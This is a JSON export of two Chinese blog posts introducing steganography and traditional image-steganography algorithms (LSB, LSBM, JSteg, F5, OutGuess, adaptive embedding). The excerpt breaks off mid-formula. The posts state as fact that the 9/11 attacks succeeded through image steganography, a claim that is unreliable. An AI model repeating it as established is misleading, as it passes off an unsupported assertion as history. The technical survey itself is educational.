[{"title":"隐写术(一)--简介","date":"2019-05-28T16:00:00.000Z","path":"2019/05/29/隐写术(一)--简介/","raw":"---\ntitle: 隐写术(一)--简介\ndate: 2019-05-29\ncategories:\ntoc: ture\ntags:\n\t- MISC\n\t- CTF\ncomments: true\n---\n\n## 0x00 隐写术背景\n\n> 在信息时代的发展、计算机软硬件的升级、多媒体技术的发展的背景下，信息隐藏愈发朝气蓬勃，已经逐渐成为信息安全研究不可或缺的方向。数千年来，人们一直希望对某些敏感的信息进行保密传送，随即发展出信息加密技术和信息隐藏技术等。在今天这个数字媒体技术和互联网技术爆发的时代，人们这样的需求更加迫切，如何在通信中保证传输秘密信息的隐蔽性已成为研究者、企业、国家关注的课题。<!-- more -->隐写术已经在当今数字世界的多个领域有所利用，例如版权保护、信息追加、防篡改、信息追踪，依托这些领域的成功，隐写术得以蓬勃发展。与加密信息的密码学不同的是，信息隐藏是通过将数据隐藏在多媒体载体中，被称为“隐藏数据中的数据”[1]，它利用人类在感官上（如视觉、听觉）的不敏感性以及媒体载体的信息冗余来隐藏额外的信息，把需要传送的信息嵌入到这些载体中，但却保持原载体信息的相对完整性以达到以假乱真的效果。数字媒体（如视频、音频、图片、网页、文本文件）的多样性保证了信息隐写技术的复杂性与相对安全性，正是因为丰富的数字媒体，信息隐藏技术才可以有丰富的隐藏方式来保证隐藏的信息只能被合法的接受者通过特定的分析技术提取出来。\n\n​\t信息隐藏的思想在很早的古希腊时代就有所体现。在那时，一位名叫Histaiaeus的古希腊人蓄意煽动反抗波斯国王的一场叛乱。由于需要传递秘密信息，他剃光了他的一个奴隶的头发，并在这个奴隶的头皮上刻下了叛变的信息，当这个奴隶的头发重新长满之后，再把他送出城外，到达另一种城池，由于他的头发已长满能覆盖掉头皮上刻下的信息，他躲过了重重的搜查，最终到达目的地。信息接收者再次剃光了这位奴隶的头，看到了起兵造反的信息。在第二次世界大战期间，德军将信息隐藏在普通照片中，这些照片经过“细微化”处理，也就是将秘密信息写在用肉眼难以察觉的照片中，间谍需要用放大镜读取，间谍通过这技术从敌国将数据传递给友军（如下图）。20世纪80年代，玛格丽特·撒切尔（Margaret Thatcher）为了追查内阁的文件是如何泄露给媒体的，让文本编辑程序处理文本时添加一些空格，以便追踪泄密的内阁成员。同样在中国古代周朝的兵书《六韬》就有《阴符》与《阴书》两篇，大概意思是以一种象征符号形象传递密文给友军；宋朝兵书的《武经总要》里，又对《阴符》略作了改进。\n\n<center>![红色圆圈内用德语写了信息](8343187-f28189616cb2ce0f.png)</center>\n\n \t隐写术和数字水印世多媒体安全两个重要的分支。前者主要是对信息进行隐藏以达到“漫天过海”的效果；后者主要是为了保证数字媒体的版权、用途，确保使用者是合法使用数字媒体。随着数字媒体的逐渐增多，数字隐写已逐渐成为隐写术的主流技术，隐写分析作为数字隐写的逆向工程，其研究内容也在随着数字隐写的发展而发展，从上世纪九十年代的隐写变革以来，已有数不胜数的分析方法，而隐写分析的主要目的是将隐写后的载体提取、分析甚至破坏其隐藏的内容。这两种技术犹如蓝军与红军一攻一防相辅相成，共同发展才得以保持平衡关系。但是在这个过程中有相当多的问题：随着人工智能时代的到来，如何提高隐写分析的效率和质量而花费较少的资源和时间成为研究者关注的重心。\n\n随着数字隐写技术的普及与发张，该技术除了被一些企业、政府、军队使用，还被一些地方武装分子、恐怖组织、极端势力利用数字隐写技术传送反动信息，以完成恐怖活动。如：2001年，著名的“911”事件的起因就是恐怖分子通过数字图像隐写技术而逃过美国情报机构的监控，最终被成功利用；2015年，Stegoloader病毒使用数字图片隐写技术入侵了全球的一些计算机系统，这款病毒使用隐写术躲避杀毒软件，成功入侵计算机，据报道其主要攻击目标是美国医疗保障公司。就在今年，即2019年，中国的一家安全企业发现一些图片携带恶意代码的有效负载，以达到攻击特定目标的目的。尽管信息安全攻防领域种，隐写术是一种低频的攻击途径，但一旦被网络犯罪分子、恐怖组织利用，代价是巨大的。因此，研究隐写分析技术在当前这个信息爆炸的时代迫在眉睫，对维护国家安全、社会稳定、企业健康发展具有重要作用。\n\n  从隐写分析算法出现的时间来分类，目前主要有传统的隐写分析算法和基于深度学习的分析算法。对于传统隐写分析方法，则主要以空域和JPEG域为数据隐藏的载体，此外还有一些自适应的隐写及隐写分析方法。目前对于LSBM的检测方法有基于直方图平滑效应的检测方法、基于自然图像邻域相关性的检测方法；针对JPEG域的盲检测算法主要是通过提取DCT系数分布特征和Markov特征来检测；针对盲检测算法，在提取特征这个方向上也有多种方法，思路一般是往高维提取统计特征。虽然目前基于深度学习的分析算法愈来愈热门，但是由于其训练耗时、模型正确性验证复杂且麻烦（很多时候无法通过理论推断模型成熟与否）一直深深困扰研究者。因此，本论文基于传统的隐写分析算法，将多种传统算法提取的特征融合，作为深度学习隐写分析分类器的输入，以提高效率与识别的准确性。\n\n## 0x10 信息隐藏基本原理及研究方法\n\n### 0x11  隐写术基本模型\n\n隐写术是一门隐藏信息的艺术和科学，可以使信息无法被发现。有一个著名的模型阐述了隐写术中各方的角色，这就是经典的Simmons模型——囚徒问题：假设Alice和Bob是监狱中的两个囚犯，他们之间的通信需要通过监狱警官Wendy来传达，同时Wendy能看到他们通信的内容，Alice和Bob要如何通信才能保证他们想要传达的秘密信息不被Wendy所检测察觉出来呢？如下图：\n\n<center>![Simmons模型](8343187-0638d974a140b5b0.png)</center>\n\n我们不妨用更细致的角度来讨论这个问题，如下图：\n<center>![细化的囚徒模型](8343187-0e4e57eadff86216.png)</center>\nAlice需要传送秘密信息m给Bob，但是她只能通过公开的载体对象C（即信纸），而且这个载体对象对第三方而言是完全透明的、可检测的。这时候她需要跟Bob商议好秘密信息嵌入的算法，然后通过嵌入算法把秘密信息m卡嵌入到载体对象C中，最终生成私密对象S，我们可以把它想象成是写满文字的信件，需要通过Wendy这个狱监传递这封信件，但同时Wendy也会检查信件，看有没有什么违法的信息。只要嵌入算法做的足够安全，或者Wendy检查过于粗糙，其中的秘密信息m就不会被他察觉出来。甚至他还可以改动这封信件，使之成为私密对象S’ （被鉴定后的信纸）。最终Bob收到这封信件后，他会用提取算法提取私密对象S’（被鉴定后的信纸）的秘密信息m’，这是Bob就能真正看到Alice真正想对Bob说的信息了。如果Bob能接收到Alice想要表达的信息，则说明越狱成功；否则，如果被监狱长Wendy发现，则越狱失败。\n\n虽然信息隐藏技术的历史悠久，但是近几十年是该技术发展的黄金时期。伴随着计算机技术、多媒体技术的蓬勃发展，信息隐藏技术的发展异彩纷呈。准确来说，信息隐藏学科是一门交叉学科，又有多个分支领域，如图：\n<center>![信息隐藏技术的分支领域](8343187-a14619039e8c39f1.png)</center>\n**隐蔽信道（Covert channel）**：在合法信道中被用来传输隐蔽信息的信道称为隐蔽信道，这种隐蔽信道具有非常强的保密性。用Simmonns的囚徒模型解释就是：Alice和Bob通过信纸传输信息，信纸上呈现出来的信息就是合法信道，但是由于Alice和Bob在信纸上通过其他手段把他们想要逃狱的意图隐藏在信息中，通过看不见的“通道”把信息传递给对方，这样的信道就是隐蔽信道。随着互联网的发展，隐蔽信道随着Internet网络协议的变化而发展（如TCP/IP/IPv6等）。按隐藏信息的载体划分，隐蔽信道又可分为两种类型的信道，分别为：存储式隐蔽信道、时间式隐蔽信道。存储式隐蔽信道通过修改网络中的数据包来实现数据隐藏，可应用于TCP/IP的各个层次中；时间式隐蔽信道是通过修改数据包的数据流形式进行数据隐藏，如：修改数据包的顺序、数据包相隔的时间等方式来形成隐蔽信道。按发送对象的意图划分，隐蔽信道分为主动式隐蔽信道、被动式隐蔽信道。发送对象既控制公开信道中信息传输，又控制隐藏信道信息传输，则为主动式隐蔽信道；如果发送对象只负责隐蔽信道的信息传输，将隐蔽信道嵌入到别的公开信道，叫做被动式隐蔽信道。如图：\n<center>![隐蔽信道模型](8343187-8ad7536104d159ad.png)</center>\n**隐写术（Steganograph）**：通过嵌入秘密信息到载体当中的一种技术。隐写信息可以先用传统方法加密，然后再通过特定算法修改载体对象（Cover），加密后的对象叫载密对象（Stego）。其实现原理为：利用载体信息在空间、时间、存储的多余内容（即信息冗余），将秘密信息嵌入到载体生成载密信息，以实现秘密信息的传输。隐写术基本模型：\n<center>![隐写术基本模型](8343187-0e3fc579b6bcf8c1.png)</center>\n**匿名（Anonymity）**：实现匿名通信，就是用现有的技术对通信中的主体进行隐藏保护，通信主体即为发送者和接受者。主要使用匿名重发技术和网络代理技术实现匿名通信[2]。Syverson提出的洋葱路由就是通过路由转发，让中间参与者互不认知对方实现匿名。\n\n  数字水印（Digital watermarking）：在多媒体信息时代，许多数字媒体需要加以保护，以保障创作者的合法权宜，数字水印技术应运而生。这种技术能够将发行的版权信息或其他表明创作者合法权益的信息嵌入到数字媒体当中，以保护数字媒体合法版权。除此之外，数字水印还需保证数字媒体的完整性和可靠性。数字水印有两个较为重要的分类分别叫做脆弱水印与鲁棒水印，这两种水印分别对应数字媒体的两种特性分别叫脆弱性与鲁棒性。其中，脆弱数字水印是指经过分发、传输、使用后，数字水印能够精准判断数字媒体是否被篡改，甚至可以判断数据篡改的位置、程度以恢复原始信息，简单讲就是脆弱性越高数字媒体细微的变化就越容易察觉，主要用来标志数字作品的版权；鲁棒数字水印是指数字媒体没修改、处理之后还能保持相对地完整，并且能被准确识别，即鲁棒性越高数字媒体保持初始状态的稳定性越高，主要用来完整性保护和认证。\n<center>![数字水印信号嵌入模型](8343187-fe6b005b013eed76.png)</center>\n<center>![数字水印信号检测模型](8343187-49f51820ef195755.png)</center>\n\n广义的隐写模型中，有两个重要的步骤，分别是嵌入（Embed）和提取（Extract），对应上两图的嵌入算法和提取算法。\n\n对于**嵌入过程（Imbedded Process）**，利用嵌入算法，甚至使用密码学算法，用密钥进行加密，使秘密信息嵌入进载体当中。对于数字媒体，载体包括：音频、视频、图像、文本等。对于秘密信息，同样包括：音频、视频、图像、文本等。例如，如今黑客常见的攻击方法就是将payload嵌入到图片当中，这一段payload是代码段，这段代码段是恶意的代码，一旦感染计算机系统很容易被提取权限、控制计算机等。秘密信息嵌入到载体之后，会生成一个新的数字媒体对象，我们把它叫做载密对象。为了确保在公开的传输通道传输过程中不被攻击者发现嵌入的秘密信息，载体与载密对象的差别必须非常微小，甚至无法察觉出来。\n\n对于**传输过程（Transfer Process）**，攻击者可以在这个过程中获得嵌入秘密信息后地载密对象。攻击者获得之后，首先检查载密对象对外呈现的（显现的）信息是否有威胁，其次再尝试各种方法、各种算法、工具分析除显现的信息（载体呈现出来的信息）之外的其他信息，即载密信息。一旦被攻击者成功提取或察觉出该载体对象含有秘密信息，则秘密信息的隐写传递失败，否则或送达给秘密信息的接收者。\n\n对于**提取过程（Extraction Processes）**，我们可以把它看成是嵌入过程的逆过程。合法的接收者接收到来自发送者发送的载密对象，利用一定的提取算法（有可能需要解密算法）提取隐藏在载密对象的秘密信息。在这一过程中，如果只需载体信号便可提取出秘密信息，我们称之为非盲提取；如果不需要载体信息即可提取秘密信息，称之为盲提取。\n\n### 0x12 信息隐藏性能评价\n虽然信息隐藏技术涵盖多个学科，分类复杂，但是对其性能的评估有共同的指标，这些指标分别有[2][3]：\n1. 不可感知性（Imperceptibilit）\n载体被嵌入隐藏信息之后，很难甚至不能被人为感知、预测。不可感知性包括不可见性和不可测性两个维度。不可见性表示载体嵌入信息后，不会造成载体对象的可感知失真，保证原始载体文件与载密文件具有高度相似性；不可测性表示对攻击者来说，难以提取、难以分辨载密文件的隐藏信息，或者说提取、检测的代价无穷大。\n\n2. 鲁棒性（Robustnes）\n即稳定性（Stability），嵌入载体的信息即使受到一定程度的干扰，也能恢复原来的状态，保持隐藏信息的准确性的能力。即需要保证隐藏信息的稳定性，不能轻易的被干扰、失去。在一般的隐写系统中，鲁棒性往往跟安全性、嵌入容量有非常强的相关性，不能都兼顾，需要根据特定的隐写场景取其最合适的性能。\n\n3. 安全性（Security）\n即保密性（privacy），指载密对象即使受到攻击者恶意分析、攻击仍能保持信息不被感知、提取的能力。通常为了保证隐藏信息的安全性，会使用密码学的加解密算法，利用密钥进行保护以保障隐藏信息的安全能力。如果一个数字隐写系统是绝对安全的，那么这个系统能够抵抗来自攻击者多维、全方向的攻击，并且攻击者拥有无限的计算能力。数字隐写系统的被攻击的过程大致可分为：证明秘密信息的存在、提取秘密信息和破坏秘密信息等三个环节。\n\n4. 隐藏容量和强度（Hide capacity and strength）\n即表征载体对象能够隐藏信息的容量大小。在保证不可感知性和安全性的前提下，隐藏容量越大越好。隐藏容量可以从空域、频域等多个维度来考虑，每种维度的容量有所差别。通常需要在隐藏容量、不可感知性、鲁棒性、安全性当中做取舍。因为嵌入的信息越多，在一定条件下安全性和鲁棒性就越脆弱。\n\n5. 嵌入效率（Embedding efficiency）\n即嵌入信息的比特数与嵌入信息后所修改的载体的比特数之比。在嵌入相同的隐藏信息比特条件下，嵌入效率也高，改变的相对比特数越少，嵌入算法安全性越高。目前有多种算法可以提高嵌入效率，如：栅格码[4]、湿纸码[5]、快速BCH码[6]等。\n\n  正如上面指标中所指出的，每种性能都有其特性，提高一种性能的指标，势必会对其他几个性能指标有所影响，所以需要全面、综合考虑这几个性能之间的联系，需要考虑应用的用途、对象等条件综合选择这几个性能。J.Fridrich在[7]中提出不可感知性、隐藏容量、鲁棒性三者之间的三角联系，如图所示：\n\n<center>![不可感知性、鲁棒性、安全性关系“铁三角”](8343187-75d710034ada886f.png)</center>\n\n> [1] Artz D. Digital steganography: hiding data within data[J]. Internet Computing IEEE, 2001, 5(3):75-80.\n[2] 刘培培. 图像脆弱数字水印和数字隐写的几个关键技术研究[D]. 西南交通大学, 2008.\n[3] 陈波, 谭运猛, 吴世忠. 信息隐藏技术综述[J]. 计算机与数字工程, 2005, 33(2):21-23.\n[4] T Filler ，J Judas ，J Fridrich. Minimizing Additive Distortion in Steganography Using Syndrome-Trellis Codes. IEEE Signal Processing Society, 2011.\n[5] Fridrich J, Goljan, Soukal D. Wet paper codes with improved embedding efficiency[J]. IEEE Transactions on Information Forensics and Security, 2006, 1(1):102-110.\n[6] Zhang R, Sachnev V, Kim H J. Fast BCH Syndrome Coding for Steganography[J].  2009.\n[7] Fridrich J . Applications of data hiding in digital images[C] International Symposium on Signal Processing & Its Applications. IEEE, 1998.\n","tags":[{"name":"CTF","slug":"CTF","permalink":"http://www.killshadow.xyz/tags/CTF/"},{"name":"MISC","slug":"MISC","permalink":"http://www.killshadow.xyz/tags/MISC/"}]},{"title":"隐写术(二)--传统数字图像隐写算法","date":"2019-05-28T16:00:00.000Z","path":"2019/05/29/隐写术(二)--传统数字图像隐写算法/","raw":"---\ntitle: 隐写术(二)--传统数字图像隐写算法\ndate: 2019-05-29\ncategories:\ntoc: ture\ntags:\n\t- MISC\n\t- CTF\ncomments: true\n---\n\n> 数字图像隐写算法根据不同的标准而有不同的分类。下面重要根据隐写算法的工作域和隐写算法的适用范围来展开数字图像隐写算法的介绍。<!-- more -->\n---------------\n## 0x10 基于空间域的隐写算法\n### 0x11 基于LSB方法的隐写算法\nLSB（Least Significant Bit），最低有效位，该算法的基本原理是将载体图像的LSB篡改为信息者想要发送的秘密信息的二进制位。LSB隐写算法是一种简单且高效的信息隐藏技术。对于PNG或者BMP图像，一般是由RGB三原色（红绿蓝）组成，每种颜色占用8bit即一个字节的空间，每个像素的像素值范围为 `0x00~0xFF`，对于彩色图来说，总共有 $256^3$种颜色。所以如果用LSB方法隐藏信息，每个像素可以隐藏3Bit的信息。LSB隐写通过修改RGB颜色分量的最低二进制位（LSB），即使图像像素当中最不重要的那一位发生改变也无法使肉眼察觉出来。一般的载体位平面图像如图：\n<center>![LSB原理示意图](8343187-2cd3356926d9d9e8.png)</center>\nLSB平面的最低位在一个像素中如图：\n<center>![LSB和位平面](8343187-59e0417e3e8c6517.png)</center>\n\n上面右边的0即为LSB，每个像素的LSB组成LSB面，我们可以在这个面嵌入信息而难以引起隐写分析的注意。下图是关于水果BMP照片的各个位平面之间的对比图：\n<center>![灰度图像8个位平面的二值图](8343187-3910e7c974727711.png)</center>\n假设我们需要嵌入3bit的秘密消息，则如下图：\n<center>![秘密信息替换载体图像的LSB成为载密图像](8343187-1195edebf489b7f7.png)</center>\n对于嵌入过程可分为三个步骤：\n\n- 步骤一：在Cover中由给定的密钥（Key）来挑选嵌入的像素数量 Length(message)；\n- 步骤二：对于经过步骤一确定的像素数量和给定的二进制格式的秘密信息，比较这些点的最不重要位（LSB）是否与待嵌入的二进制格式的秘密信息相同，如果相同，则不更改最不重要位（LSB）；否则，执行步骤三；\n- 步骤三：用二进制格式的秘密信息替换掉选定像素点的最不重要位（LSB），而该像素点除了LSB的其他二进制位保持不变，则修改成为Stego。\n\n对于提取过程，根据密钥（Key）找到Stego中嵌入密码信息的像素位置，随后抽出这些像素灰度值的LSB，排列后组成秘密信息，最后将这些二进制信息转成ASCII码或Uni11code码等其他编码格式的文本或者其他多媒体格式。\n\n在上述嵌入秘密信息的步骤三中，有一个重要环节是选择嵌入秘密信息的像素位置，通常有两种方法可以实现——随机间隔和连续嵌入法，如下两图所示：\n<center>![连续嵌入法](8343187-50504f197a39e8f0.png)</center>\n<center>![随机间隔法 ](https://upload-images.jianshu.io/upload_images/8343187-c9d41c4241fd9b27.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\n\n LSB是较为早期的隐写算法，该方法原理简单、嵌入容量大、嵌入成本低，但是会导致灰度值在`2i`和`2i+1`的像素趋于一致，因此出现了“值对”效应。基于这种易于被统计的现象，隐写分析者设计出差分直方图检测法[1]、RS检测法[2]、$x^2$检测法[3]。\n\n### 0x12 LSBM隐写算法\n\n“值对”现象的出现，极大地降低了隐写系统的安全性，数字图像隐写的研究者们竭力在寻找能够修改甚至替代LSB的算法，只为消除其“值对”现象。LSBM算法便是在此背景下被Toby Sharp提出。该算法只是在LSB的基础上做了细微的“优化”来避免“值对”现象，在嵌入秘密信息的时候，如果载体图像被选定的、待嵌入的像素点的LSB与二进制形式的秘密信息不同，则对该LSB任意地`+1`或者`-1`（必须保证其随机性，以防止攻击者的“值对”分析）。此外，研究者还将加减复读进行了扩展，假设欲加减的正整数为 `K`，在这里`K`有两种情况，一种是当$K\\in奇数$的时候，使待嵌入的秘密信息二进制形式对应的比特位与数字图像待嵌入点的像素值的LSB保持一致。另一种则是当$K\\in偶数$时，数字图像待嵌入点的像素值LSB的前一位和秘密信息保持一致。这种方法有效地避免了在2i和2i+1之间的值对现象，能够绕过$x^2$检测方法和RS检测方法。基于LSBM隐写算法还出现了其他改进算法提高嵌入效率、增强隐写算法的安全性如：LSBMR（LSBM Revisited）[4]算法和G-LSBM（Generalization of LSBM）[5]算法等。此外，还出现了最低多位替换算法MLSB（Multi LSB）算法。及其改进算法IMLSB（Independent MLSB）和TMLSB（Truss MLSB）。IMLSB算法根据密钥选取图像的最低多个平面上的比特位，并将其替换为秘密信息。该方法对各个位平面的影响是独立的，因此简称为IMLSB替换隐写；TMLSB算法根据密钥选取图像像素，然后将所选像素的最低多位看做一个整体，替换为秘密信息，因此简称为TMLSB替换隐写。\n\n### 0x13 随机调制隐写算法\n随机调制隐写算法[6]基本思想是将欲嵌入信息调制成具有特定概率分布的噪声，并用调制后的信号替代图像获取设备带来的噪声（如高斯白噪声），使攻击者无法区分这些噪声是由图像获取设备产生的还是由隐写所引起的。首先，定义奇偶函数（Parity Function）：\n$$\n\\begin{split}\nf(x, s)=\\left\\{\\begin{array}{ll}{0,} {s=0} \\\\ {-1 or +1,  s \\neq 0}\\end{array}\\right.\\\\\nf(x+s, s)=-f(x-s, s)\n\\end{split} \\tag{1}\n$$\n其中$x∈{0≤i≤255}$, i是整数, s取所有整数，且s不等于0，则对某个固定的s，可以任意定义$f(x, s)$的前2s个值，然后推知2s+1以后的所有函数值。\n\n早期的噪声随机调制算法有Marvel等人提出来的SSIS（Spread Spectrum Image Steganography）[7]算法。该算法将秘密信息经过调制后跟载体图像叠加以实现信息隐藏；提取时，需要根据载密图像的数据推测载体图像，将载密图像和载体图像的差值（也就是噪声值）通过解调解析出秘密信息。此外，该方法还引入了纠错码技术，以提高秘密信息的准确率。\n\n### 0x14 有限调色板图像隐写术\n\n图像处理中为了节省表示图像RGB信息的空间用调色板存储彩色信息（RGB值），数据区只存储当前像素的色彩在调色板中的位置，这样就省了很多字节。不过真彩色的图像没有调色板。利用调色板数据进行隐藏，其基本思想是用秘密信息比特替换调色板的颜色向量的LSB。在实际图像数据中进行LSB的替换。此类隐写首先需要对调色板进行排序，排序后调色板中相邻颜色在感官上是接近的。用调色板的排序方式对信息进行编码。因为有N!种不同的方式对调色板进行排序，所以可以用来对一个短信息进行编码。保持调色板的颜色不变，数目扩大一倍，因此图像中的每一个颜色值对应两个调色板索引，根据秘密信息比特，选择两个相同颜色中的一个。基于调色板的信息隐藏，其鲁棒性都较差，攻击者只要对调色板重新排序、或者对图像的格式进行变换，就很有可能破坏秘密信息。\n\n## 0x20 基于变换域的隐写算法\n\nLSB及其变形是空域算法，虽然嵌入、提取容易，但是鲁棒性差、安全性低，易于造成隐藏信息的损失或被攻击者发现隐藏信息。随着互联网技术不断发展，JPEG[8]（Joint Photographic Experts Group，联合图像专家小组）图像由于其优秀的压缩能力也在网络中大量传输，而JPEG图像编码算法公开获得了很多隐写研究者的青睐。由此，数字图像隐写研究者考虑从变换域中嵌入信息。由于JPEG图像格式采用的是有损压缩技术，通过不同的质量因子，图像显示的效果会有所不同，因而使得攻击者难以辨别图像中的异常是嵌入的隐藏信息还是因为有损压缩导致的噪点。对于JPEG图像的生成过程，如图所示：\n<center>![ JPEG压缩算法流程图](8343187-32a945f431350912.png)</center>\n\n\n其中最重要的有四个步骤：夜色模式转换/采样、DCT、量化、编码。DCT（Discrete Cosine Transform，离散余弦变换）是码率压缩中常用的一种变换编码方法。DCT过程是隐写研究者着重研究的内容，在DCT变换的系数上隐写是常见的隐写方法，也是众多隐写方法的着手点。\n\n### 0x21 JSteg隐写算法\n\nJSteg是最早用于JPEG隐写的隐写算法，其核心思想就是将空域的LSB隐写应用到JPEG图像的DCT变换过程中。具体来说，就是将二进制的隐藏信息嵌入到DCT系数的LSB上，如果隐藏信息的二进制数与DCT的LSB相对应的二进制数相同则不替换，否则替换成隐藏信息的二进制数。如图所示。\n<center>![JPEG的DCT系数LSB替换](8343187-dcd875e2fb0d97d1.png)</center>\n\nJSteg隐写算法整体流程如下图：\n<center>![JSteg隐写算法的流程](8343187-3c316505cfd6906d.png)</center>\n\n虽然JSteg算法简单、高效，但是同样或出现“值对”效应，很容易被直方图统计攻击，因此在卡方攻击面前无所遁形。JPEG图像由于其算法特性具有两个标志性统计特征分别是：分块效应和直方图特性，因此大部分隐写分析算法利用这两个统计特性进行攻击。通用的JSteg检测方法有：基于小波特征函数统计矩阵的隐写分析方法、基于支持向量机的多特征盲检测算法等。基于小波特征函数统计矩阵的隐写分析方法将小波子带特征函数的统计矩阵作为隐写分析的特征；基于支持向量机的多特征盲检测算法则利用分块效应，将载密图像解压到空域后，裁剪图像然后冲压缩得到校准图像，最后得出特征函数。\n\n### 0x22 F5隐写算法\n在F5隐写算法[9]出现之前，还出现过其前身F3、F4[9]隐写算法。F3隐写算法解决了JSteg隐写算法的DCT系数直方图的“值对”现象。与LSBM隐写算法类似，F3算法在非零DCT系数上的LSB嵌入信息，如果秘密信息的比特位与对应DCT系数的LSB比特位的值相同，则不变，否则对该DCT系数的LSB`±1`。F3算法成功抵抗了卡方攻击和RS攻击，提高了变换域隐写的安全性，但是该算法仍能通过直方图统计的方法找到其特征，因此无法有效避免统计攻击。由此研究者提出了F4隐写算法，优化了嵌入秘密信息后的DCT系数奇偶正负的特性，使得嵌入信息后的DCT系数一阶统计特性保持不变。而F5隐写算法的统计系数直方图会向中间靠拢，由此无法抵抗直方图攻击，由此Fridrich提出了nsF5隐写算法[10]（no-shrinkage F5），该算法利用湿纸编码算法消除了直方图收缩效应，该算法时JSteg系列算法中较为安全的算法，可以被用来测试盲检测算法的性能。\n\n### 0x23 OutGuess隐写算法\n\nOutGuess隐写算法[11]是由Niels Provos提出的为了解决JP Hide&Seek隐写算法缺陷的方法。该算法主要有两个步骤：1）嵌入过程：不修改值为0,1的DCT系数，通过伪随机数生成器生成下一步嵌入的位置（即，跳转的间隔）；2）纠正过程：利用未被修改的DCT系数来保证DCT系数的统计直方图保持跟嵌入秘密信息前的直方图相似，以消除值对现象。所以该方法既保持了DCT系数一阶统计特性，也保持了直方图的统计特性。后面Sallee又提出基于模型的隐写方法（Model Based）MB1隐写算法[12]及其改进算法MB2隐写算法[13]。MB1算法利用DCT系数出现的概率通过Cauchy分布对其进行拟合、算术重编码，以保持直方图统计特性；MB2算法在MB1的基础上对非零系数的隐写作了进一步限制——只能嵌入少于一半非零系数的秘密二进制信息，此外还对没有嵌入秘密信息的DCT非零系数做了微调，提高了统计特性的稳定性，增强了隐写算法的安全性。\n\n## 0x30 基于数字图像自适应隐写算法\n\n数字图像自适应隐写是近十年来众多学者较为关注的一个方向，因为它相较于传统算法具有较强的安全性、鲁棒性。自适应隐写根据载体图像的纹理和待隐藏的信息，根据载体图像的纹理复杂度自适应地调节嵌入的数据量。大部分自适应算法都是基于“嵌入失真+隐写编码”架构实现图像的自适应隐写。目前有多种隐写编码技术，如：湿纸编码[14]、ZZW编码[15][16][17]和矩阵编码[18]等，但是目前较为广泛的还是STC编码[19]，其可以通过最小化嵌入失真算法让性能无限接近于最优解，当然也有这些编码的融合方法，如基于湿纸码和STC码的高效隐写算法[20]。自适应隐写算法充分考虑了Stego（载体）的图像纹理特性，通过分析Stego的特点，将秘密信息有选择地嵌入到纹理较为复杂、边缘较为明显的图像区域中。这样做的好处在于：既能保持载体图像外在呈现出来的图像信息，保留视觉上的完整性，又降低了专用隐写分析算法的分析准确率，具有较强的抗分析能力。自适应隐写发展经历了不同的时期，不同的时期有不同的代表算法。\n\n### 0x31 数字图像自适应隐写基本概念\n\n在典型的“嵌入失真+隐写编码”架构中，嵌入失真函数基于最小加性失真的方法，研究者主要研究的有两个方向分别是：失真函数的设计和最小化嵌入失真的实现。如前面所说，自适应隐写的最终目的是让隐秘信息根据载体图像的纹理特征自动调整嵌入信息的强度，使嵌入的秘密信息极力地伪装成载体图像的噪声，让隐写分析攻击者难以分析，防止秘密信息在传输过程中被截获、分析、破坏，提高图像隐写的安全性。为了达到这一目的，就需要从三个维度——“加性失真函数+最小嵌入失真+隐写编码算法”来考虑：加性失真函数能够自适应地在载体图像中根据载体图像的纹理特性寻找最合适的像素点；最小嵌入失真方法能够考量如何想载体图像嵌入秘密信息的过程中使载体图像特性的变化最小化；而隐写编码算法则根据最小失真方法改变的参数来调整嵌入的效率和速率。为了进一步提高隐写编码算法的效率，还出现了多种隐写编码算法的融合方法，如：融合湿纸码和STC码的隐写算法[20]。下面会介绍以上三个维度每种最基础的方法，以便后续理解和分析各种自适应隐写算法。\n\n1. 加性失真函数\n研究表明，载体图像的统计特性的变化与载体图像的纹理特征具有很强的相关性，这种强相关表现在：载体图像的纹理特征越复杂，其嵌入秘密信息后的改变程度越小。而加性失真函数就是评估秘密信息嵌入载体图像后其统计特性改变程度的一种方法，换而言之，失真函数能够反映图像纹理的复杂度，通过失真函数，能够为后期最小嵌入失真提供数据支撑。我们定义两张图片分别为载体图像ℂ和载密图像𝕊，其大小均为 ，载体图像ℂ和载密图像𝕊的像素点取整范围分别为：\n$$\n\\begin{split}\nC_{i,j}\\in0,1,2,\\ldots,253,254,255 \\\\\nS_{i,j}\\in0,1,2,\\ldots,253,254,255 \\\\\n\\end{split}  \\tag{2}\n$$\n我们定义$\\beta_{i, j}$为载体图像ℂ在$(i, j)$位置的像素$C_{i, j}$改变为载密图像𝕊位置$(i, j)$的像素$S_{i, j}$产生的失真参数[21]，则载体图像ℂ整体嵌入失真函数$\\Delta(\\mathbb{C}, \\mathbb{S})$为：\n$$\n\\Delta(\\mathbb{C}, \\mathbb{S})=\\sum_{i=1}^{m} \\sum_{j=1}^{n} \\beta_{i j}\\left|C_{i j}-S_{i, j}\\right|, \\quad\\left(0 \\leq \\rho_{i, j} \\leq \\infty\\right)\n\\tag{3}\n$$\n由上述公式可知，嵌入失真函数跟载体图像密切相关。具体来讲，$\\left|C_{i, j}-S_{i, j}\\right|$差值越大，即载体图像改变程度越大，则整体的失真度越高。当然，为了便于理解，这只是一个简单的模型，真正的隐写模型使用到的失真函数比这个更为复杂。\n\n2. 最小嵌入失真\n我们已经通过上述步骤求得嵌入失真函数，接下来就需要考虑怎么把嵌入失真最小化，以最小化嵌入秘密信息带来的对载体信息统计特性的影响，最小化嵌入失真就由此提出。显然，最小化嵌入失真是一个求极值的问题，也就是求最小值的问题，求解这样的问题最有效的方法是求导找斜率，最小嵌入失真函数便基于此思想建立。设$\\pi(\\mathrm{i}, j)$为载体图像ℂ在位置$(i, j)$的像素$C_{i, j}$改变为载密图像𝕊位置$(i, j)$像素$S_{i, j}$的概率，$m$为嵌入的秘密信息的二进制长度。为了求出公式$3$中的最优解（即最小值），我们对其取极值得：\n$$\n\\pi\\left(S_{\\mathrm{i}, \\mathrm{j}}\\right)=\\frac{\\mathrm{e}^{-\\lambda \\rho_{i, j}}}{\\sum_{S \\in \\tau_{\\mathrm{ij}}} \\mathrm{e}^{-\\lambda \\rho_{i, j}}}\n\\tag{4}则秘密信息长度$m$为：\n$$\n则秘密信息长度$m$为：\n$$\nm=\\sum_{i=1}^{m} \\sum_{j=1}^{n} \\sum_{S \\in \\tau_{i, j}} \\pi\\left(S_{i, j}\\right) \\log \\frac{1}{\\pi\\left(S_{i, j}\\right)}\n\\tag{5}\n$$\n由公式$5$可得在最小嵌入失真的前提下，可嵌入的秘密信息的长度。这一重要结论在于分离了图像模型$\\pi\\left(S_{\\mathrm{i}, 